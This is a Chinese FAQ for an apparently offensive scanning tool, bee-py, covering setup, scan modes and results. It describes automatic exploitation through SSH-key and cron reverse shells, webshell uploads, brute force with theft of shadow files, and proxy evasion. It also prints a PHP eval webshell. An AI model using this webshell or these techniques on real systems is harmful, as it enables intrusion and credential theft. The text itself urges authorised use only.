# ❓ 常见问题 FAQ（千奇百怪问题大全）

> 这里收集了小白可能问到的各种奇奇怪怪的问题，按分类整理，遇到问题先在这里搜，99%能找到答案。

---

## 📦 安装相关问题

### Q: 提示 `python3: command not found` 怎么办？
A: 说明Python3没安装或者没加到系统PATH里。按照GETTING_STARTED.md第一步重新安装Python，Windows用户**一定要勾选「Add Python to PATH」**。

### Q: Windows安装完Python还是提示「不是内部或外部命令」怎么办？
A: 100%是你安装的时候没勾「Add Python.exe to PATH」。解决方法：
1.  卸载Python（控制面板→卸载程序→找到Python卸载）
2.  重新安装，**一定要勾那个小方框！**
3.  卸载重装不丢人，别瞎改环境变量，越改越乱

### Q: 安装依赖的时候报错 `Permission denied` 怎么办？
A: 权限不足：
- Mac/Linux：在命令前面加sudo，比如 `sudo pip3 install -r requirements.txt`，输入你电脑开机密码（输入的时候屏幕不显示字，正常，输完回车就行）
- Windows：关闭CMD，右键点击CMD选择「以管理员身份运行」，再重新执行安装命令

### Q: 安装依赖的时候下载很慢，或者报Timeout超时错误怎么办？
A: 因为默认下载源在国外，换成国内清华源：
```bash
# Mac/Linux
pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# Windows
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
```

### Q: 安装lxml/pycryptodome这些库报错怎么办？
A: 这些库有C扩展，编译需要依赖：
- Mac：先执行 `xcode-select --install` 安装命令行工具，然后重新安装依赖
- Windows：直接安装Anaconda（https://www.anaconda.com/），自带这些科学计算库，不用自己编译
- Linux（Debian/Ubuntu/Kali）：先执行 `sudo apt install python3-dev python3-pip libxml2-dev libxslt1-dev zlib1g-dev -y` 再装依赖

### Q: 我已经装了Python，但是pip还是找不到怎么办？
A: 试试用python模块方式运行pip：
```bash
# Mac/Linux
python3 -m pip install -r requirements.txt

# Windows
python -m pip install -r requirements.txt
```

### Q: 提示urllib3的NotOpenSSLWarning警告怎么办？
A: 没关系，只是警告，不影响使用。Mac系统自带的LibreSSL老版本问题，忽略就行，想去掉的话升级Python到3.10+或者自己装OpenSSL版Python。

---

## 🚀 使用相关问题

### Q: 为什么我一运行就提示`cd: no such file or directory`？
A: 你不在bee-py文件夹里！
- Mac/Linux：先执行 `ls` 看看当前文件夹有什么，确认你把bee-py放在哪了，用cd命令进去。比如放在桌面就是 `cd ~/Desktop/bee-py`
- Windows：先执行 `dir` 看看，放在桌面就是 `cd Desktop\bee-py`
- 看到saomiao.py/diaodu.py/report.py这三个文件，就说明你在对的位置了

### Q: 扫描目标怎么写？要不要加http://或https://？
A: 都可以：
- 直接写域名/IP：`python3 saomiao.py example.com` 或 `python3 saomiao.py 192.168.1.100`，默认测80/443
- 带http/https前缀：`python3 saomiao.py http://example.com:8080`，会扫描你指定的端口
- 如果目标开在非标准端口（比如8080/8888），最好带上前缀和端口

### Q: 扫描一个目标大概需要多久？
A: 取决于目标开放端口数量、网络情况、你用的速度模式：
- 普通站点，normal模式：10-30分钟左右
- fast模式内网：几分钟就完
- safe模式外网：可能半小时到1小时
- 如果开了弱口令爆破，时间取决于字典大小，可能更久

### Q: 如何停止正在运行的扫描？
A: 按 `Ctrl + C`（按住Ctrl不松，按一下C）。多线程程序可能要等个几秒才会停，耐心等一下，多按几次也行。

### Q: 我怕扫描的时候被封IP，怎么办？
A: 按优先级给你方案：
1.  **首选**：加 `--safe` 参数，自动用低并发慢速，默认配置已经比较安全
2.  **次选**：用代理IP池，`-p proxies.txt` 参数，准备一堆代理轮换
3.  **手动控制**：`--delay 1` 设置每次请求间隔1秒，更慢更稳
4.  **不要**：上来就开100线程fast模式扫外网，不封你封谁

### Q: --fast、--normal、--safe三档有什么区别？我该用哪个？
A: 
- 扫内网/本地靶场/客户授权让你快点测：用 `--fast`
- 普通情况，不知道用啥：就用默认的 `--normal`（不用加参数）
- 扫外网站点，怕被封，慢慢扫不着急：用 `--safe`

### Q: -k参数是干嘛的？什么时候用？
A: `-k` 是忽略SSL证书验证。遇到以下情况一定要加：
- 目标用了自签名证书（比如内网设备、测试环境）
- 目标证书过期了
- 目标域名和证书不匹配
- 报错说 `SSL: CERTIFICATE_VERIFY_FAILED`
加上就好了，不影响扫描结果。

### Q: -t线程数开多少合适？
A: 
- 外网：不要超过30，建议10-20，加--safe更稳妥
- 内网/授权测试：可以开50-100，看服务器承受能力
- 不是越大越好！线程太高会把目标打挂，或者WAF直接封你IP，适得其反

### Q: -T超时时间设置多少合适？
A: 
- 目标网络好（内网/国内站点）：默认8秒够了
- 目标网络慢（国外站点、卡顿的站点）：设置15-30秒，`-T 15`
- 超时太短会漏东西，太长会拖慢整体速度，自己平衡

### Q: 为什么扫描的时候一堆红色的超时/连接失败？
A: 常见原因：
1.  目标IP写错了，或者目标关机了/服务没开 → 先ping一下目标看看通不通
2.  目标有防火墙/WAF，直接丢你的包 → 加--safe慢点，或者用代理
3.  线程开太高，目标扛不住拒绝响应 → 降低线程数
4.  网络问题，你自己网不好 → 检查你自己的网络

### Q: 为什么扫描完没自动跑弱口令爆破？
A: weakpass（多服务弱口令）、bruteforce（SSH智能爆破）、weblogin（Web后台爆破）这三个工具因为流量大、容易触发告警/封IP，**默认是手动运行**的，不会自动跑。你可以：
- 进入调度台，输入对应工具编号手动运行
- 调度台输入a全自动，程序会问你要不要运行爆破类工具，输入y就行

### Q: 为什么我跑了半天什么漏洞都没发现？
A: 很正常，不是每个站都有漏洞：
1.  先确认你进调度台输入了`a`运行所有工具，而不是只扫了个端口就完事了
2.  目标本身确实防护做得好，没明显漏洞（这种情况很多）
3.  WAF拦截了你的请求，工具没收到响应以为不存在 → 换代理/降速度/绕WAF
4.  工具只是快速检测，不是100%覆盖，可能漏洞，需要手动测
记住：工具只是辅助，能不能挖到洞最终还是看你自己的技术。

### Q: 支持同时扫描多个目标吗？
A: 当前v3.1版本主要设计为单目标扫描。想批量扫的话：
1.  写个shell脚本循环跑就行
2.  批量扫描计划在v4.0版本支持

### Q: 可以中途换代理或者改速度吗？
A: 当前版本运行中不能改，只能停了重新跑。

---

## 📁 结果和文件相关问题

### Q: 扫描结果存在哪里？我想重新扫怎么清空？
A: 所有结果都在 `data/` 文件夹：
- `data/scans/` - 端口扫描和指纹结果
- `data/results/` - 各个工具的利用结果
- `data/reports/` - HTML报告
想重新开始，把data目录下对应域名的文件删了就行，或者直接清空整个data文件夹（自动重建）。

### Q: 生成的HTML报告在哪里？
A: `data/reports/` 文件夹下，文件名格式是 `report_{域名}_{时间戳}.html`，双击用浏览器打开就行。

### Q: heapdump文件下载在哪里？怎么打开？
A: Spring Boot heapdump自动下载在 `data/results/springboot_exploit/` 目录下。
- 打开工具：Eclipse Memory Analyzer (MAT)，官网免费下载
- 能分析出什么：数据库密码、AK/SK密钥、Session信息、内存里的各种敏感数据

### Q: 为什么报告里有些密码显示`root:1234****`？
A: 自动脱敏，防止报告泄露明文密码。完整明文密码在对应工具的json结果文件里，需要的话自己去 `data/results/weakpass/` 或 `data/results/bruteforce/` 里找。

### Q: 为什么我生成的报告是空的/什么漏洞都没有？
A: 因为你只跑了saomiao.py扫描，没跑diaodu.py执行漏洞工具。正确流程是：saomiao.py → diaodu.py（输入a跑所有工具）→ report.py。

### Q: 我上次扫了一半中断了，能继续吗？
A: 端口扫描结果会保存，直接运行 `python3 diaodu.py` 会读取上次的扫描结果，不需要重新扫端口。

---

## 🔧 工具功能相关问题

### Q: 发现漏洞之后会自动getshell吗？
A: 分情况：
- 高危未授权漏洞（Redis/MongoDB/Jenkins等）：会自动尝试利用，写SSH公钥/写计划任务反弹shell
- 文件上传漏洞：会自动尝试上传webshell并验证是否能访问
- 弱口令爆破成功（SSH/MySQL等）：会自动执行命令收集系统信息
- SQL注入/XSS这些：只检测存在，不会自动拖库/打XSS，需要你手动利用
- Shiro/ThinkPHP/Spring这些RCE：检测漏洞存在，不会直接执行系统命令，需要你自己构造利用链

总之一句话：危险操作（写文件/反弹shell）只会在明确的未授权场景自动做，其他都需要你手动确认。

### Q: 工具说发现了SQL注入，我怎么确认是真的？
A: 任何扫描器都有误报，快速检测的结果一定要手动验证：
- 找到报错注入点，手工加个单引号看报不报错
- 用sqlmap跑一下确认
- 不要工具说啥就是啥，一定要手动验证

### Q: swagger_leak工具能干什么？
A: 扫到Swagger/OpenAPI文档（/swagger-ui.html、/v2/api-docs等路径）之后：
1.  自动提取所有API接口
2.  解析内嵌在JS里的swaggerDoc
3.  自动测试哪些接口不需要认证就能直接访问
4.  标记出危险接口（用户信息、文件上传、添加用户、删除等）
帮你快速审接口，不用一个个手动点。

### Q: injection工具检测哪些注入？
A: 快速检测三类常见注入：
- SQL注入（基于报错和布尔盲注快速判断）
- XSS跨站脚本（反射型）
- LFI本地文件包含（读/etc/passwd等）
注意这只是快速初筛，不是全面注入测试，复杂注入还是需要手工测或者用sqlmap。

### Q: bruteforce和weakpass有什么区别？
A: 两个都是爆破工具：
- `weakpass`：通用多服务爆破，支持SSH/MySQL/Redis/FTP/PostgreSQL/MongoDB/Telnet等多种服务，速度快
- `bruteforce`：专门针对SSH的智能爆破，带防封机制，随机间隔，爆破成功后自动执行深度后渗透信息收集（系统信息、/etc/passwd、shadow、history、敏感配置文件等），更稳更慢但东西多
按需选择，想快用weakpass，想稳要后渗透用bruteforce。

### Q: webshell工具怎么用？
A: 你已经上传了webshell之后，用这个连接交互：
```bash
python3 -m tools.webshell <你的webshell地址> --pwd <密码参数名>
```
例子：如果你上传的是一句话`<?php @eval($_POST['cmd']); ?>`，地址是`http://example.com/shell.php`，那就是：
```bash
python3 -m tools.webshell http://example.com/shell.php --pwd cmd
```
进入交互终端后：
- 直接输入系统命令回车执行
- 输入`info`一键自动收集所有系统信息
- 输入`exit`退出

---

## 🚨 法律和边界问题

### Q: 我可以扫互联网上的网站吗？我就是练练手不做坏事。
A: **不可以！** 哪怕你不做坏事，未经授权扫描也是违反《网络安全法》的行为。只要目标不是你的，你没有书面授权，就别扫。被溯源到了轻则警告罚款，重则行政拘留，留案底影响一辈子，不值得。

### Q: 我可以扫自己搭的本地靶场吗？
A: **非常推荐！** 本地搭Vulhub、Pikachu、DVWA这些靶场练手，既合法又能学到东西，想怎么扫怎么扫。

### Q: 我可以扫学校/公司内网吗？
A: 看情况：
- 公司给你书面授权做渗透测试：可以
- 你自己好奇扫公司/学校内网：不可以！被发现了轻则开除/记过，重则报警

### Q: CTF比赛可以用吗？
A: CTF比赛规则允许用扫描器的前提下当然可以，帮你节省时间。

### Q: 我扫自己买的云服务器可以吗？
A: 你自己的服务器当然可以，但是注意：
- 不要扫到隔壁邻居的IP（云厂商内网）
- 流量不要太大被云厂商告警封机
- 最好还是本地搭靶场更安全

---

## 🐛 其他奇怪问题

### Q: Windows下中文显示乱码怎么办？
A: CMD编码问题：
1.  运行命令之前先执行 `chcp 65001` 切换到UTF-8编码
2.  推荐安装「Windows Terminal」（微软商店免费），比默认CMD好用多了，不会乱码

### Q: Mac/Linux下终端颜色显示不对，一堆奇怪的字符？
A: 换个现代终端：
- Mac用iTerm2（免费）
- Linux用系统自带的就行，别用太老的终端

### Q: 按Ctrl+C程序停不下来怎么办？
A: 多按几次，或者等个几秒钟，多线程要等正在发的请求超时才会退出。实在不行直接关终端窗口，不影响结果保存。

### Q: 为什么CDN后面的站点扫描结果不准？
A: CDN会隐藏真实IP，很多CDN有通配符响应，扫到的都是CDN节点的东西不是真实源站。如果要扫真实源站，需要先找到源站IP再扫，怎么找源站自己百度。

### Q: 为什么扫到很多404页面都显示200状态码？
A: 这是通配符404（也叫软404），就是你访问不存在的路径，服务器也返回200 OK，给你一个统一的错误页面。saomiao.py已经做了通配符检测，尽量过滤了，但还是可能有漏的，看结果的时候注意区分。

### Q: 我加了自己的字典，为什么没生效？
A: 检查：
1.  字典路径对不对，放在dicts/目录下
2.  字典文件编码是不是UTF-8（Windows记事本默认存ANSI，可能乱码）
3.  一行一个路径/密码，不要有空行和多余空格
4.  改完字典不需要重启，下次扫描自动加载

### Q: 怎么更新工具到最新版本？
A: 如果你是git克隆的，直接在bee-py目录执行 `git pull` 就行。如果是下载的zip包，重新下载最新版覆盖，注意备份你的data目录和自己加的字典。

### Q: 这个工具能绕WAF吗？
A: 没有内置WAF绕过功能，就是常规扫描。需要绕WAF你自己加代理、改延时、换Payload，工具只是帮你发请求，绕WAF是人的活不是工具的活。

### Q: 为什么工具运行的时候输出一堆乱七八糟的日志？
A: info是普通信息，success是成功发现东西，warning是警告，error是错误，vuln是发现漏洞（红色高亮）。看红色的就行，其他不用管。

### Q: 我想开发自己的插件/加新工具，怎么弄？
A: 看 `docs/ARCHITECTURE.md` 里的「如何添加新武器」章节，有详细说明，照着模板写就行，不用改主程序代码，注册一下就能用。
